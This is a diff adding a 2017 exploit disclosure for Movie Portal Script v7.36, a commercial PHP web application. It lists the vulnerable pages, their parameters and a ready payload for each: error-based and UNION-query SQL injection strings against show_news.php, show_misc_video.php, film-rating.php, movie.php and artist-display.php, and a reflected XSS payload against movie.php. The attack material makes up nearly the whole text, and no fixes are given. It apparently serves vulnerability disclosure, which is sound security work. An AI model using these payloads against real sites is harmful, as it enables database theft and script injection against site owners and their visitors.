@@ -1,0 +1,56 @@
+Exploit Title : Movie Portal Script v7.36 - Multiple Vulnerability
+Google Dork :    -
+Date : 20/01/2017
+Exploit Author : Marc Castejon <marc@silentbreach.com>
+Vendor Homepage : http://itechscripts.com/movie-portal-script/
+Software Link: http://movie-portal.itechscripts.com
+Type : webapps
+Platform: PHP
+Sofware Price and Demo : $250
+
+------------------------------------------------
+Type: Error Based Sql Injection
+Vulnerable URL:http://localhost/[PATH]/show_news.php
+Vulnerable Parameters: id
+Method: GET
+Payload:  AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT(0x71786b7a71,(SELECT
+(ELT(1222=1222,1))),0x717a627871,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+-----------------------------------------------
+Type: Reflected XSS
+Vulnerable URL: http://localhost/[PATH]/movie.php
+Vulnerable Parameters : f=
+Payload:<img src=i onerror=prompt(1)>
+---------------------------------------------
+Type: Error Based Sql Injection
+Vulnerable URL:http://localhost/[PATH]/show_misc_video.php
+Vulnerable Parameters: id
+Method: GET
+Payload:  AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT(0x71786b7a71,(SELECT
+(ELT(1222=1222,1))),0x717a627871,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+-----------------------------------------------
+
+Type:Union Query Sql Injection
+Vulnerable URL:http://localhost/[PATH]/movie.php
+Vulnerable Parameters: f
+Method: GET
+Payload:  -4594 UNION ALL SELECT
+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7871,0x6452766b715a73727a634a497a7370474e6744576c737a6a436a6e566e546c68425a4b426a53544d,0x71627a7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+-----------------------------------------------
+Type: Union Query Sql Injection
+Vulnerable URL:http://localhost/[PATH]/artist-display.php
+Vulnerable Parameters: act
+Method: GET
+Payload:  UNION ALL SELECT
+NULL,CONCAT(0x71706a7871,0x6b704f42447249656672596d4851736d486b45414a53714158786549644646716377666471545553,0x717a6a7a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+-----------------------------------------------
+
+Type: Error Based Sql Injection
+Vulnerable URL:http://localhost/[PATH]/film-rating.php
+Vulnerable Parameters: v
+Method: GET
+Payload:  AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT(0x71786b7a71,(SELECT
+(ELT(1222=1222,1))),0x717a627871,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
